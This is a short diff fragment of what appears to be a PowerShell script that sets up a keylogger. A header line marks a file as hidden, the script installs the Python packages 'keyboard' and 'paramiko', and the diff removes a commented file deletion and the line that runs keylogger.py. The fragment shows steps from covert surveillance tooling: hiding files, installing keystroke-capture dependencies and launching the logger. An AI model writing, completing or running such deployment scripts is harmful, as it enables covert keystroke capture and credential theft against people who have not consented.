@@ -15,6 +15,3 @@ $HIDE1.Attributes="Hidden"
 pip3 install keyboard
 pip3 install paramiko
 
-<# Remove-Item requirements.txt #>
-
-python3 .\keylogger.py
